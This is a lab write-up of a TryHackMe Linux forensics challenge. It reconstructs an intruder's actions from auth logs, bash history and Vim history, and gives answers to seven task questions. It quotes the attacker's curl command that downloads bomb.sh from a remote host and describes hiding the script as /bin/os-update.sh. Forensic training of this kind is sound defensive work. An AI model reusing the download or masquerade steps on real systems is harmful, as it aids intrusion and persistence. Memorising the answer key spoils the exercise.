# TryHackMe – Linux Investigation Challenge
## Practical Lab Documentation

This repository contains my hands-on forensic investigation of a compromised Linux host provided in the TryHackMe environment. 
The goal of this lab is to practice foundational Linux DFIR (Digital Forensics and Incident Response) skills: analyzing system logs, identifying unauthorized access, uncovering persistence mechanisms, and reconstructing the attacker's activities.

## Environment
* **Platform:** TryHackMe
* **Room:** Linux Forensics
* **Operating System:** Ubuntu 20.04.6 LTS
* **Kernel Version:** 5.15.0-1077-aws
* **Architecture:** x86_64

## Core Concepts Practiced
* **System & OS Information:** Enumerating release details, user accounts (`/etc/passwd`), and sudoers.
* **System Configuration:** Auditing network interfaces, open ports (`netstat`), and running processes (`ps`).
* **Persistence Mechanisms:** Inspecting Cron jobs, systemd services, and shell startup scripts (`.bashrc`).
* **Evidence of Execution:** Analyzing command history (`.bash_history`) and authentication logs (`/var/log/auth.log`).
* **Log Analysis:** Reviewing syslog and third-party application logs for indicators of compromise (IOCs).

---

## Investigation Reference Tool
During this lab, the following **Linux Forensics Cheatsheet** provided by TryHackMe was used to identify critical file locations and forensic artifacts:

<img width="630" height="892" alt="image" src="https://github.com/user-attachments/assets/cb427c2a-9277-435d-bc7b-81cbebde72cc" />

---

## Tasks & Solutions

### 1. The user installed a package on the machine using elevated privileges. According to the logs, what is the full COMMAND?

#### Method
To identify commands executed with elevated privileges, I analyzed the authentication logs located in `/var/log`. 
1. Initially, I searched the current `auth.log` file using `grep sudo`, but found no relevant installation commands.
2. I then inspected the rotated log file `auth.log.1`, which often contains older session data.
3. By filtering for `sudo`, I identified a log entry where the user `cybert` used `sudo` to install a package via `apt`.

**Commands used:**
`cat /var/log/auth.log.1 | grep sudo`

**Screenshot:**
<img width="1325" height="434" alt="image" src="https://github.com/user-attachments/assets/eb9143ec-1da3-488d-8f01-0f144b405498" />

<img width="1343" height="43" alt="image" src="https://github.com/user-attachments/assets/5ebcb59e-cb88-4573-bf0b-9a05e2476bbe" />


#### Answer
/usr/bin/apt install dokuwiki

### 2. What was the present working directory (PWD) when the previous command was run?

#### Method
The information regarding the working directory is embedded within the same log entry in `auth.log.1` as the installation command identified in the previous task. By analyzing the metadata of the `sudo` event for the `apt install` command, the `PWD` (Present Working Directory) field explicitly states the location from which the command was executed.

**Log details analyzed:**
* **User:** cybert
* **Command:** /usr/bin/apt install dokuwiki
* **PWD Field:** /home/cybert

**Screenshot:**
<img width="1412" height="52" alt="image" src="https://github.com/user-attachments/assets/685f0b4d-60a1-406b-bc40-f223607e517b" />

#### Answer
/home/cybert

### 3. Which user was created after the package from the previous task was installed?

#### Method
To identify any new users created by the attacker or the system, I searched the authentication logs for the execution of user management binaries. 
1. Since the volume of logs was manageable, I performed a targeted search using `grep` for the `adduser` command within `/var/log/auth.log.1`.
2. This revealed a specific entry where the user `cybert` (acting with root privileges) created a new account.
3. The timestamp of this action follows the previously identified package installation, confirming it as a subsequent step in the attacker's activity.

**Command used:**
`cat /var/log/auth.log.1 | grep adduser`

**Screenshot:**
<img width="1355" height="57" alt="image" src="https://github.com/user-attachments/assets/49a290ef-3115-42f6-b171-01cd29059dbe" />

#### Answer
it-admin

### 4. A user was then later given sudo privileges. When was the sudoers file updated? (Format: Month Day HH:MM:SS)

#### Method
To find when the `sudoers` file was modified, I looked for the execution of the `visudo` command. This tool is the standard and recommended way to grant sudo privileges to users in Linux.
1. Based on the investigation hint, I focused on identifying instances where `visudo` was called with root privileges.
2. I executed `grep` on `auth.log.1` to filter for this specific command.
3. The search returned two instances:
   * **Dec 22 07:58:24:** Performed by user `ubuntu`.
   * **Dec 28 06:27:34:** Performed by user `cybert`.
4. Since the package installation and the creation of the `it-admin` account occurred on **Dec 28**, the second entry represents the attacker's action to solidify elevated access for the new accounts.

**Command used:**
`cat /var/log/auth.log.1 | grep visudo`

**Screenshot:**
<img width="1212" height="146" alt="image" src="https://github.com/user-attachments/assets/e01d9884-dca1-4f4c-b514-4e8d23df54d8" />


#### Answer
Dec 28 06:27:34

### 5. A script file was opened using the "vi" text editor. What is the name of this file?

#### Method
To identify which files were accessed or modified by the attacker using text editors, I searched the authentication logs for the execution of `vi`. 
1. I used `grep` to filter `auth.log.1` for the string `vi`. 
2. The results displayed a command executed by the newly created user `it-admin` with root privileges.
3. The log entry shows that `it-admin` used `/usr/bin/vi` to open a file named `bomb.sh` located in their home directory. 

**Command used:**
`cat /var/log/auth.log.1 | grep vi`

**Screenshot:**
<img width="1316" height="212" alt="image" src="https://github.com/user-attachments/assets/cb3a4a9b-7a6e-4b8a-8bfb-db900672dfd5" />


#### Answer
bomb.sh

### 6. That bomb.sh file is a huge red flag! What is the command used that created the file bomb.sh?

#### Method
Since the `bomb.sh` file was no longer present on the file system, I investigated the command history to determine its origin. 
1. I navigated to the home directory of the suspicious user `it-admin` and inspected their `.bash_history` file.
2. The history revealed that the user utilized the `curl` command to download the script from a remote server (`10.10.158.38`) on port `8080`.
3. The command included the `--output` flag, which saved the downloaded content directly as `bomb.sh`.
4. The history also confirms the subsequent use of `sudo vi bomb.sh` and the final deletion of the file using `rm bomb.sh` to hide evidence.

**Command discovered in .bash_history:**
`curl 10.10.158.38:8080/bomb.sh --output bomb.sh`

**Screenshot:**

<img width="741" height="254" alt="image" src="https://github.com/user-attachments/assets/9d11c1bd-a5ae-4b9a-852c-f64ebf71a360" />


#### Answer
curl 10.10.158.38:8080/bomb.sh --output bomb.sh

### 7. The file was renamed and moved to a different directory. What is the full path of this file now?

#### Method
Since the file `bomb.sh` was deleted from the initial location, I investigated whether it had been moved or renamed before removal. 
1. Following the lead that the file was opened with `vi`, I checked the `.viminfo` file in the `/home/it-admin` directory.
2. The `.viminfo` file stores command-line history and actions performed within the Vim editor.
3. I discovered a `saveas` command in the history: `saveas /bin/os-update.sh`.
4. This confirms the attacker attempted to disguise the malicious script as a legitimate system update utility by moving it to a critical system directory (`/bin/`).

**Command used to inspect Vim history:**
`cat /home/it-admin/.viminfo`

**Screenshot:**
<img width="636" height="867" alt="image" src="https://github.com/user-attachments/assets/981ee835-c1e6-40e4-8a9e-cb7703b96cb9" />


#### Answer
/bin/os-update.sh
